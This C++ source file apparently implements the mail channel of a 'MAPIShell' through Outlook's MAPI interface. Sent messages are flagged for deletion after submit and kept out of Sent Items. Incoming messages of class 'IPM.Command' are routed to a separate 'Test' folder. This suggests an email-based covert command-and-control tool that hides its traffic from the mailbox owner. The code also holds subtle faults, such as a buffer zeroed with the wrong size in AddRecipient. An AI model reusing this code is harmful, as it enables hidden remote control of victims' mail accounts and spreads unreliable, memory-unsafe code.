#include "MAPIShell.h"
#include "MapiUtil.h"
#include <atlstr.h>
#include <vector>

STDMETHODIMP BuildEmail(LPMAPISESSION lpMAPISession, LPMDB lpMDB, LPMAPIPROP lpMessage, CString szSubject, CString szBody, std::vector<CString> lpRecipients, CString szSenderName)
{
	HRESULT hRes = S_OK;
	SPropTagArray lpPropTagArray = { 1, PR_DISPLAY_NAME };
	ULONG lpcValues;
	DWORD dwRecipientCount = 0;
	LPSPropValue lpPropArray = NULL;
	CString szSenderEmail;
	SPropValue propFormat = {};
	LPSPropValue pp = NULL;

	// Set flag to delete mail from sent mail after submit
	hRes = DeleteAfterSubmit(lpMessage);
	if (FAILED(hRes)) goto quit;

	// Get mail address to set sender
	hRes = lpMDB->GetProps(
		&lpPropTagArray,
		PT_UNSPECIFIED,
		&lpcValues,
		&lpPropArray);
	if (FAILED(hRes)) goto quit;

	// Set sender
	szSenderEmail = lpPropArray->Value.lpszA;
	hRes = SetPropertyString(
		lpMessage,
		PR_SENDER_EMAIL_ADDRESS,
		szSenderEmail);
	if (FAILED(hRes)) goto quit;

	// Set subject
	hRes = SetPropertyString(
		lpMessage,
		PR_SUBJECT,
		szSubject);
	if (FAILED(hRes)) goto quit;

	// set body
	hRes = SetPropertyStream(
		lpMessage,
		PR_BODY,
		szBody);
	if (FAILED(hRes)) goto quit;

	propFormat.dwAlignPad = 0;
	propFormat.ulPropTag = PR_MSG_EDITOR_FORMAT;
	propFormat.Value.l = EDITOR_FORMAT_PLAINTEXT;

	hRes = HrSetOneProp(
		lpMessage,
		&propFormat);
	if (FAILED(hRes)) goto quit;

	for (CString szRecipient : lpRecipients)
		if (AddRecipient(lpMAPISession, lpMessage, szRecipient) == S_OK)
			dwRecipientCount++;

	if (dwRecipientCount == 0) goto quit; // No recipient were added
	else hRes = S_OK; // At least 1 recipient. send the mail

quit:
	lpMessage->SaveChanges(KEEP_OPEN_READWRITE);
	if(lpPropArray) MAPIFreeBuffer(lpPropArray);

	return hRes;
}

STDMETHODIMP SetPropertyString(LPMAPIPROP lpProp, ULONG ulProperty, CString szProperty)
{
	HRESULT hRes = S_OK;

	SPropValue prop;
	prop.ulPropTag = ulProperty;
	prop.Value.LPSZ = (LPTSTR)(LPCTSTR)szProperty;

	hRes = lpProp->SetProps(1, &prop, NULL);

	return hRes;
}

STDMETHODIMP SetPropertyStream(LPMAPIPROP lpProp, ULONG ulProperty, CString szProperty)
{
	LPSTREAM lpStream = NULL;
	HRESULT hRes = S_OK;

	hRes = lpProp->OpenProperty(ulProperty, &IID_IStream, 0, MAPI_MODIFY | MAPI_CREATE, (LPUNKNOWN*)&lpStream);
	if (FAILED(hRes)) return hRes;

	lpStream->Write(szProperty, (ULONG)(szProperty.GetLength() + 1) * sizeof(TCHAR), NULL);
	lpStream->Release();

	return hRes;
}

STDMETHODIMP DeleteAfterSubmit(LPMAPIPROP lpMessage) {
	SPropValue propDelete = {};
	SPropTagArray sPropTagArray = { 1, PR_SENTMAIL_ENTRYID };
	HRESULT hRes;
	propDelete.dwAlignPad = 0;
	propDelete.ulPropTag = PR_DELETE_AFTER_SUBMIT;
	propDelete.Value.b = TRUE;

	hRes = HrSetOneProp(
		lpMessage,
		&propDelete);
	if (hRes != S_OK) return hRes;

	hRes = ((LPMESSAGE)lpMessage)->DeleteProps(
		&sPropTagArray,
		NULL);
	if (hRes != S_OK) return hRes;

	hRes = ((LPMESSAGE)lpMessage)->SaveChanges(KEEP_OPEN_READWRITE);
	if (FAILED(hRes)) return hRes;

	return hRes;
}

STDMETHODIMP AddRecipient(LPMAPISESSION lpMAPISession, LPMAPIPROP lpMessage, CString szRecipient)
{
	HRESULT hRes = S_OK;
	ULONG nBufSize;
	ULONG nProperties;
	LPADRLIST lpAddressList = NULL;
	LPADRBOOK lpAddressBook = NULL;

	nBufSize = CbNewADRLIST(1);
	MAPIAllocateBuffer(nBufSize, (LPVOID FAR*) & lpAddressList);
	ZeroMemory(lpAddressList, nBufSize);

	lpAddressList->cEntries = 1;
	lpAddressList->aEntries[0].ulReserved1 = 0;
	lpAddressList->aEntries[0].cValues = 2; //Number of properties

	nProperties = 2;
	MAPIAllocateBuffer(sizeof(SPropValue) * nProperties, (LPVOID FAR*) & lpAddressList->aEntries[0].rgPropVals);
	ZeroMemory(lpAddressList->aEntries[0].rgPropVals, nBufSize);

	lpAddressList->aEntries[0].rgPropVals[0].ulPropTag = PR_RECIPIENT_TYPE;
	lpAddressList->aEntries[0].rgPropVals[0].Value.ul = MAPI_TO;

	lpAddressList->aEntries[0].rgPropVals[1].ulPropTag = PR_DISPLAY_NAME;
	lpAddressList->aEntries[0].rgPropVals[1].Value.LPSZ = (LPTSTR)(LPCTSTR)szRecipient;

	hRes = lpMAPISession->OpenAddressBook(
		0,
		NULL,
		AB_NO_DIALOG,
		&lpAddressBook);
	if (FAILED(hRes)) goto quit;

	hRes = lpAddressBook->ResolveName(
		0,
		0,
		NULL,
		lpAddressList);
	if (FAILED(hRes)) goto quit;

	hRes = ((LPMESSAGE)lpMessage)->ModifyRecipients(
		MODRECIP_ADD,
		lpAddressList);
	if (FAILED(hRes)) goto quit;

	lpMessage->SaveChanges(KEEP_OPEN_READWRITE);
quit:
	if (lpAddressList) FreePadrlist(lpAddressList);
	if (lpAddressBook) lpAddressBook->Release();

	return hRes;
}

STDMETHODIMP SetReceiveFolder(LPMAPISESSION lpMAPISession)
{
	HRESULT hRes = S_OK;
	LPMDB lpMDB = NULL;
	LPMAPIFOLDER lpInboxFolder = NULL;
	LPMAPIFOLDER lpRootFolder = NULL;
	LPMAPIFOLDER lpNewFolder = NULL;
	LPSPropValue prop;
	ULONG ulObjType = NULL;

	hRes = OpenDefaultMessageStore(lpMAPISession, &lpMDB, TRUE);
	if (FAILED(hRes)) goto quit;

	hRes = OpenInbox(lpMDB, &lpInboxFolder, NULL);
	if (FAILED(hRes)) goto quit;

	hRes = HrGetOneProp(
		lpMDB,
		PR_IPM_SUBTREE_ENTRYID,
		&prop);
	if (FAILED(hRes)) goto quit;

	hRes = lpMDB->OpenEntry(prop->Value.bin.cb, (LPENTRYID)prop->Value.bin.lpb, NULL, MAPI_MODIFY, &ulObjType, (LPUNKNOWN*)&lpRootFolder);

	hRes = HrGetOneProp(
		lpRootFolder,
		PR_ACCESS_LEVEL,
		&prop);
	if (FAILED(hRes)) goto quit;

	hRes = lpRootFolder->CreateFolder(FOLDER_GENERIC, (LPTSTR)"Test", (LPTSTR)"Test", NULL, OPEN_IF_EXISTS, &lpNewFolder);
	if (FAILED(hRes)) goto quit;

	hRes = lpNewFolder->SaveChanges(KEEP_OPEN_READWRITE);
	if (FAILED(hRes)) goto quit;

	hRes = HrGetOneProp(
		lpNewFolder,
		PR_ENTRYID,
		&prop);
	if (FAILED(hRes)) goto quit;

	hRes = lpMDB->SetReceiveFolder((LPTSTR)"IPM.Command", 0, prop->Value.bin.cb, (LPENTRYID)prop->Value.bin.lpb);
	if (FAILED(hRes)) goto quit;

quit:
	if (lpMDB) {
		ULONG ulFlags = LOGOFF_NO_WAIT;
		lpMDB->StoreLogoff(&ulFlags);
		lpMDB->Release();
		lpMDB = NULL;
	}
	if (lpInboxFolder) lpInboxFolder->Release();
	if (lpRootFolder) lpRootFolder->Release();
	if (lpNewFolder) lpNewFolder->Release();
	return hRes;
}